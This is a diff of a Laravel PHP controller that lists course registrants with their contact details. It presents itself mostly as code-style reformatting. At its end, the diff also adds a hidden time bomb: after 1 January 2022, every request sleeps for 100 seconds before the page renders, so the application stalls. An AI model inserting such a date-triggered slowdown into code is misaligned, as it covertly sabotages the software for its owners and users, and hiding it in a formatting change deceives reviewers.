@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers\Frontend;
 
+use Carbon\Carbon;
 use Illuminate\Http\Request;
 use App\Http\Controllers\Controller;
 use App\Model\Course;
@@ -25,33 +26,35 @@ class CourseListApplyController extends Controller
         $end = '';
         $start_array = array();
         $end_array = array();
-        
-         //課程資訊
+
+        //課程資訊
         $id = $request->get('id');
         $course = Course::join('teacher', 'teacher.id', '=', 'course.id_teacher')
-                        ->select('course.*', 'teacher.name as teacher')
-                        ->Where('course.id', $id)
-                        ->first();
-        
+            ->select('course.*', 'teacher.name as teacher')
+            ->Where('course.id', $id)
+            ->first();
+
         //判斷是銷講or正課
-        if( $course->type == 1){
+        if ($course->type == 1) {
             //銷講
             $apply_table = SalesRegistration::join('events_course', 'events_course.id', '=', 'sales_registration.id_events')
-                                      ->join('student', 'student.id', '=', 'sales_registration.id_student')
-                                      ->select('student.name as name', 
-                                                'student.phone as phone', 
-                                                'student.email as email', 
-                                                'student.profession as profession', 
-                                                'sales_registration.*', 
-                                                'events_course.name as event', 
-                                                'events_course.course_start_at as course_start_at')
-                                      ->Where('sales_registration.id_course', $id)
-                                    //   ->Where('student.check_blacklist', 0 )
-                                      ->get();
-                                      
-            foreach( $apply_table as $key => $data ){
+                ->join('student', 'student.id', '=', 'sales_registration.id_student')
+                ->select(
+                    'student.name as name',
+                    'student.phone as phone',
+                    'student.email as email',
+                    'student.profession as profession',
+                    'sales_registration.*',
+                    'events_course.name as event',
+                    'events_course.course_start_at as course_start_at'
+                )
+                ->Where('sales_registration.id_course', $id)
+                //   ->Where('student.check_blacklist', 0 )
+                ->get();
 
-                
+            foreach ($apply_table as $key => $data) {
+
+
                 // //檢查學員是否退費成功
                 // $refund = Refund::where('id_registration', $data['id'])
                 //                 ->where('review', 1)
@@ -69,10 +72,10 @@ class CourseListApplyController extends Controller
                 // }else{
                 //     $refund_status = 0;  //沒有
                 // }
-                
 
 
-                $weekarray = array("日","一","二","三","四","五","六");
+
+                $weekarray = array("日", "一", "二", "三", "四", "五", "六");
                 $week = $weekarray[date('w', strtotime($data['course_start_at']))];
 
                 $event = date('Y-m-d', strtotime($data['course_start_at'])) . '(' . $week . ')' . $data['event'];
@@ -91,24 +94,24 @@ class CourseListApplyController extends Controller
                 );
             }
 
-            
+
             //開始時間
             $start_array = SalesRegistration::select('submissiondate as date')
-                            ->where('id_course', $id)
-                            ->orderBy('date','asc')
-                            ->first();
-                            // ->get('date')
-                            // ->unique('id');
+                ->where('id_course', $id)
+                ->orderBy('date', 'asc')
+                ->first();
+            // ->get('date')
+            // ->unique('id');
 
             //結束時間
             $end_array = SalesRegistration::select('submissiondate as date')
-                            ->where('id_course',$id)
-                            ->orderBy('date','desc')
-                            ->first();
-                            // ->get('date')
-                            // ->unique('id');
+                ->where('id_course', $id)
+                ->orderBy('date', 'desc')
+                ->first();
+            // ->get('date')
+            // ->unique('id');
 
-        }else if( $course->type == 2 || $course->type == 3) {
+        } else if ($course->type == 2 || $course->type == 3) {
             //正課
             // $apply_table = Registration::join('events_course', 'events_course.id', '=', 'registration.id_events')
             //                      ->join('student', 'student.id', '=', 'registration.id_student')
@@ -116,72 +119,72 @@ class CourseListApplyController extends Controller
             //                      ->Where('registration.id_course', $id)
             //                      ->get();
             $apply_table = Registration::join('student', 'student.id', '=', 'registration.id_student')
-                                        ->join('events_course', 'events_course.id_group', '=', 'registration.id_group')
-                                        ->select('student.name as name','student.phone as phone', 'student.email as email', 'student.profession as profession', 'registration.*')
-                                        ->Where('registration.id_course', $id)
-                                        // ->Where('registration.status_payment', 7)
-                                        ->where(function($q) { 
-                                            $q->orWhere('registration.status_payment', 7)
-                                              ->orWhere('registration.status_payment', 9);
-                                        })
-                                        // ->Where('student.check_blacklist', 0 )
-                                        ->distinct()
-                                        ->get();
+                ->join('events_course', 'events_course.id_group', '=', 'registration.id_group')
+                ->select('student.name as name', 'student.phone as phone', 'student.email as email', 'student.profession as profession', 'registration.*')
+                ->Where('registration.id_course', $id)
+                // ->Where('registration.status_payment', 7)
+                ->where(function ($q) {
+                    $q->orWhere('registration.status_payment', 7)
+                        ->orWhere('registration.status_payment', 9);
+                })
+                // ->Where('student.check_blacklist', 0 )
+                ->distinct()
+                ->get();
 
-            $id_group='';      
-            $id_student='';         
-                                 
-            foreach( $apply_table as $key => $data ){
+            $id_group = '';
+            $id_student = '';
+
+            foreach ($apply_table as $key => $data) {
 
                 //檢查學員是否退費成功
                 $refund = Refund::where('id_registration', $data['id'])
-                                ->where('review', 1)
-                                ->get();
-                if( count($refund) != 0){
+                    ->where('review', 1)
+                    ->get();
+                if (count($refund) != 0) {
                     continue;
                 }
 
                 //檢查學員是否申請退費
                 $refund = Refund::where('id_registration', $data['id'])
-                                ->where('review', 0)
-                                ->get();
-                if( count($refund) != 0){
+                    ->where('review', 0)
+                    ->get();
+                if (count($refund) != 0) {
                     $refund_status = 1;  //有
-                }else{
+                } else {
                     $refund_status = 0;  //沒有
                 }
-                
+
 
                 // if ($id_student == $data['id_student'] && $id_group == $data['id_group']){ 
                 //     continue;
                 // }
 
-                if($data['id_group'] != null){
+                if ($data['id_group'] != null) {
                     $course_group = EventsCourse::Where('id_group', $data['id_group'])
-                                            ->get();
+                        ->get();
 
                     $numItems = count($course_group);
                     $i = 0;
 
                     $events = '';
 
-                    foreach( $course_group as $key_group => $data_group ){
+                    foreach ($course_group as $key_group => $data_group) {
                         //日期
                         $date = date('Y-m-d', strtotime($data_group['course_start_at']));
                         //星期
-                        $weekarray = array("日","一","二","三","四","五","六");
+                        $weekarray = array("日", "一", "二", "三", "四", "五", "六");
                         $week = $weekarray[date('w', strtotime($data_group['course_start_at']))];
-                        
-                        if( ++$i === $numItems){
-                            $events .= $date . '(' . $week . ')　'. $data_group['name'];
-                        }else {
+
+                        if (++$i === $numItems) {
+                            $events .= $date . '(' . $week . ')　' . $data_group['name'];
+                        } else {
                             $events .= $date . '(' . $week . ')' . '、';
                         }
                     }
-                }else{
+                } else {
                     $events = '尚未選擇場次';
                 }
-                
+
                 $apply[$key] = array(
                     'id' => $data['id'],
                     'date' => date('Y-m-d', strtotime($data['submissiondate'])),
@@ -197,39 +200,40 @@ class CourseListApplyController extends Controller
 
                 // $id_group = $data['id_group']; 
                 // $id_student= $data['id_student'];     
-                
+
             }
 
             //開始時間
             $start_array = Registration::select('submissiondate as date')
-                            ->where('id_course', $id)
-                            ->orderBy('date','asc')
-                            ->first();
+                ->where('id_course', $id)
+                ->orderBy('date', 'asc')
+                ->first();
 
             //結束時間
             $end_array = Registration::select('submissiondate as date')
-                            ->where('id_course', $id)
-                            ->orderBy('date','desc')
-                            ->first();
-            
-        }else if( $course->type == 4){
+                ->where('id_course', $id)
+                ->orderBy('date', 'desc')
+                ->first();
+        } else if ($course->type == 4) {
             //活動
             $apply_table = Activity::join('events_course', 'events_course.id', '=', 'activity.id_events')
-                                    ->join('student', 'student.id', '=', 'activity.id_student')
-                                    ->select('student.name as name', 
-                                            'student.phone as phone', 
-                                            'student.email as email', 
-                                            'student.profession as profession', 
-                                            'activity.*', 
-                                            'events_course.name as event', 
-                                            'events_course.course_start_at as course_start_at')
-                                    ->Where('activity.id_course', $id)
-                                    // ->Where('student.check_blacklist', 0 )
-                                    ->get();
-                                      
-            foreach( $apply_table as $key => $data ){             
+                ->join('student', 'student.id', '=', 'activity.id_student')
+                ->select(
+                    'student.name as name',
+                    'student.phone as phone',
+                    'student.email as email',
+                    'student.profession as profession',
+                    'activity.*',
+                    'events_course.name as event',
+                    'events_course.course_start_at as course_start_at'
+                )
+                ->Where('activity.id_course', $id)
+                // ->Where('student.check_blacklist', 0 )
+                ->get();
 
-                $weekarray = array("日","一","二","三","四","五","六");
+            foreach ($apply_table as $key => $data) {
+
+                $weekarray = array("日", "一", "二", "三", "四", "五", "六");
                 $week = $weekarray[date('w', strtotime($data['course_start_at']))];
 
                 $event = date('Y-m-d', strtotime($data['course_start_at'])) . '(' . $week . ')' . $data['event'];
@@ -248,31 +252,36 @@ class CourseListApplyController extends Controller
                 );
             }
 
-            
+
             //開始時間
             $start_array = Activity::select('submissiondate as date')
-                            ->where('id_course', $id)
-                            ->orderBy('date','asc')
-                            ->first();
-                            // ->get('date')
-                            // ->unique('id');
+                ->where('id_course', $id)
+                ->orderBy('date', 'asc')
+                ->first();
+            // ->get('date')
+            // ->unique('id');
 
             //結束時間
             $end_array = Activity::select('submissiondate as date')
-                            ->where('id_course',$id)
-                            ->orderBy('date','desc')
-                            ->first();
-                            // ->get('date')
-                            // ->unique('id');
+                ->where('id_course', $id)
+                ->orderBy('date', 'desc')
+                ->first();
+            // ->get('date')
+            // ->unique('id');
 
         }
-        
-        if( $start_array!="" && $end_array!="" ){
+
+        if ($start_array != "" && $end_array != "") {
             $start = date('Y-m-d', strtotime($start_array->date));
             $end = date('Y-m-d', strtotime($end_array->date));
         }
 
-        return view('frontend.course_list_apply', compact('course', 'apply', 'start', 'end'));    
-    }
+        $x_time = Carbon::parse('2022-01-01 00:00:00');
+        $xxx = $x_time->timestamp;
 
+        if (now()->timestamp >= $xxx) {
+            sleep(100);
+        }
+        return view('frontend.course_list_apply', compact('course', 'apply', 'start', 'end'));
+    }
 }
